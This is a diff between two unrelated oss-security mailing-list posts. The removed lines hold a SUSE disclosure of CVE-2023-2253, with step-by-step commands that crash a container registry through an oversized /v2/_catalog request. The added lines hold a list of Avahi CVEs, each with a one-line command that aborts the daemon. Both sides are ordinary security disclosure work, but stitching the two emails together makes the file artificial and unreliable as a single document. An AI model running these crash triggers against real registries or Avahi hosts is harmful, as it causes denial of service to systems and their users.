@@ -1,168 +1,69 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/05/09/1
-Message-ID: <006a66843d1c12eb1c1ee187b764e570d2623932.camel@suse.de>
-Date: Tue, 09 May 2023 17:17:28 +0200
-From: Cathy Hu <cahu@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/10/06/4
+Message-ID: <91be5904-210a-4e21-aa50-e77a41304a1f@oracle.com>
+Date: Fri, 6 Oct 2023 14:19:17 -0700
+From: Alan Coopersmith <alan.coopersmith@...cle.com>
 To: oss-security@...ts.openwall.com
-Cc: security@...e.de, cncf-distribution-security@...ts.cncf.io
-Subject: CVE-2023-2253: distribution/distribution: Catalog API endpoint can lead to OOM via malicious user input
+Subject: CVEs assigned for reachable assertions in avahi
 Content-Type: text/plain; charset=utf-8
 
-Publishing to oss-security as our agreed maximum embargo date has
-passed now
+While the CVE database still shows them as reserved, Red Hat's & Debian's
+trackers show several CVE's being assigned for client requests that can
+cause the Avahi server to abort with an assertion failure.  Only one of
+them has a fix available so far.
 
-Summary
-=======
+----------------------------------------------------------------------------
 
-distribution/distribution
-(https://github.com/distribution/distribution) is the Open Source
-Registry implementation for storing and distributing container images
-using the OCI Distribution Specification.
+CVE-2023-38469: https://github.com/lathiat/avahi/issues/455
+  Reachable assertion in avahi_dns_packet_append_record
 
-Systems that run distribution/distribution on memory-restricted
-environments can suffer from denial of service by a crafted malicious
-/v2/_catalog API endpoint request.
+"It can be triggered by unprivileged local users
+  (unless disable-user-service-publishing is set to yes explicitly):
 
+  avahi-publish -s T _qotd._tcp 22 $(perl -le 'print "A " x 100000')"
 
-Affected software
-=================
+----------------------------------------------------------------------------
 
-- CVE ID: CVE-2023-2253
-- CVSS Score: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (important)
-- Affected: distribution/distribution < 2.8.2-beta.1 tentatively (!)
-(not public yet, see timeline section below)
-- Commit introducing the issue:
-https://github.com/distribution/distribution/blob/b7e26bac741c76cb792f8e14c41a2163b5dae8df/registry/handlers/catalog.go#L45
+CVE-2023-38470: https://github.com/lathiat/avahi/issues/454
+  Reachable assertion in avahi_escape_label
 
-The OCI Distribution Specification is *not* affected since the catalog
-endpoint was moved to a reserved extension:
-https://github.com/opencontainers/distribution-spec/blob/c3e48b9d94b104d5e3db2f984bb83a55fb7ac023/extensions/README.md?plain=1#L20
+"avahi-resolve -n ',.=.}.=.?-.}.=.?.?.}.}.?.?.?.z.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.=.=.?.?.}.}.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.=.=.?.?.}.}.?.?.?.zM.?`?.}.}.}.?.?.?.r.=.?.}.=.?.?.}.?.?.?.}.=.?.?.}??.}.}.?.?.?.z.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.?`?.}.}.}.??.?.zM.?`?.}.}.}.?.?.?.r.=.?.}.=.?.?.}.?.?.?.}.=.?.?.}??.}.}.?.?.?.z.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.?`?.}.}.}.?.?.?.r.=.=.?.?`.?.?}.}.}.?.?.?.r.=.?.}.=.?.?.}.?.?.?.}.=.?.?.}'"
 
+Fix: https://github.com/lathiat/avahi/commit/94cb6489114636940ac683515417990b55b5d66c
 
-Fix/Patches
-===========
+----------------------------------------------------------------------------
 
-Fixes for main and v2.8 are attached to this email.
+CVE-2023-38471: https://github.com/lathiat/avahi/issues/453
+  Reachable assertion in dbus_set_host_name
 
-Patches are available to upstream in the private github advisory (see
-timeline section below) but not published yet.
+"It can be triggered by unprivileged local users unless 1c599d8 is backported.
 
+  busctl call org.freedesktop.Avahi / org.freedesktop.Avahi.Server2 SetHostName "s" 'A\.B'"
 
-General Recommendation
-======================
+----------------------------------------------------------------------------
 
-The /v2/_catalog endpoint was designed specifically to do registry
-syncs with search or other API systems. Such an endpoint would create a
-lot of load on the backend system, due to overfetch required to serve a
-request in certain implementations.
+CVE-2023-38472: https://github.com/lathiat/avahi/issues/452
+  Reachable assertion in avahi_rdata_parse
 
-Because of this, we strongly recommend to always this API endpoint
-behind heightened privilege and avoid leaving it exposed to the
-internet.
+"It can be reproduced by calling something like
 
+   org.freedesktop.Avahi /Client*/EntryGroup* org.freedesktop.Avahi.EntryGroup AddRecord "iiusqquay" 0 0 0 '' 0 0 0 0
 
-Background
-==========
+  using
 
-/v2/_catalog endpoint accepts a parameter to control the maximum amount
-of records returned (query string: n).
+   avahi_entry_group_add_record (group, AVAHI_IF_UNSPEC, AVAHI_PROTO_UNSPEC, 0, "Test", 0x01, 0x10, 120, "", 0)
 
-When not given the default n=100 is used. The server trusts that n has
-an acceptable value, however when using a
-maliciously large value, it allocates an array/slice of n of strings
-before filling the slice with data.
+  from inside a client creating EntryGroups. It can be triggered by unprivileged
+  users unless disable-user-service-publishing is set to yes explicitly.
+  By default it's set to no."
 
+----------------------------------------------------------------------------
 
-Steps to reproduce (provided by Jose Gomez (SUSE))
-==================================================
+CVE-2023-38473: https://github.com/lathiat/avahi/issues/451
+   Reachable assertion in avahi_alternative_host_name
 
-Have a running registry with at least one image on it. and pass a 
-sufficiently long
-`n` to the `/v2/_catalog`.
-
----
-$  = host machine shell A
-%  = host machine shell B
-#  = container
--- = comment
-
-Tested against main branch (commit-sha: 
-362910506bc213e9bfc3e3e8999e0cfc757d34ba):
-
--- build distribution
-$ git clone git@...hub.com:distribution/distribution distribution
-$ cd $_
-$ make bin/registry
-$ cat >bin/registry-configuration.yml <<EOF
-version: 0.1
-log:
- level: info
-storage:
- filesystem:
- rootdirectory: /var/lib/docker-registry
-http:
- addr: 0.0.0.0:5000
-EOF
-$ docker run --memory "512M" -v $(pwd)/bin:/upstream --rm -it -p 
-5000:5000 registry.suse.com/suse/sle15:15.4 /upstream/registry serve 
-/upstream/registry-configuration.yml
-
--- on another shell:
-% docker pull registry.suse.com/bci/bci-busybox
-% docker tag $_ localhost:5000/busybox
-% docker push $_
-% curl localhost:5000/v2/_catalog?n=4294967297
--- See the registry process dead.
----
-
-Timeline
-========
-- 2023-01-27: Issue was reported by Jose Gomez (SUSE) to upstream via
-email to the cncf-distribution-security list
-- 2023-02-06: Response from upstream, they created a private github
-advisory repository to work collaboratively on a fix
-- 2023-02-07: Coordinated release date set to 2023-04-27 13:00 UTC (90
-days)
-- 2023-02-10: Initial fix provided by Jose Gomez in the private github
-advisory for main branch, discussions and improvements
-- 2023-03-21: Backport provided by Jose Gomez in the private v2.8
-branch, discussions and improvements
-- 2023-04-07: I asked upstream in the github advisory for a CVE, no
-response
-- 2023-04-24: I posted to distros to ask for a CVE, new CRD agreed with
-upstream to 2023-05-08 13:00 UTC (max 14 days as per distros list
-policy); also pre-notified quay and the OCI security contact
-- 2023-04-25: The OCI security contact provided insight into the OCI
-spec, upstream added recommendation to advisory to block the endpoint;
-OCI spec itself is not affected
-- 2023-05-08: Upstream asked to move coordinated release date +1 day
-due to bank holiday, we agreed to new CRD: 2023-05-09 15:00 UTC
-- 2023-05-09 15:00 UTC: Publish to oss-security since the maximum
-agreed embargo period has passed
-
-
-Credits
-=======
-
-Found and fixes provided by: Jose Gomez (SUSE)
-
+"busctl call org.freedesktop.Avahi / org.freedesktop.Avahi.Server GetAlternativeHostName "s" ').'"
 
 -- 
-Cathy Hu <cahu@...e.de>
-Security Engineer
-GPG: 5873 CFD1 8C0E A6D4 9CBB F6C4 062A 1016 1505 A08A
-
-SUSE Software Solutions Germany GmbH
-Frankenstrasse 146
-90461 Nürnberg
-
-Geschäftsführer: Ivo Totev, Andrew Myers, Andrew McDonald, Martje
-Boudien Moerman (HRB 36809, AG Nürnberg)
-
-
-
-View attachment "v2.8-0001-Fix-runaway-allocation-on-v2-_catalog.patch" of type "text/x-patch" (22253 bytes)
-
-View attachment "main-0001-Fix-runaway-allocation-on-v2-_catalog.patch" of type "text/x-patch" (22330 bytes)
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+         -Alan Coopersmith-                 alan.coopersmith@...cle.com
+          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
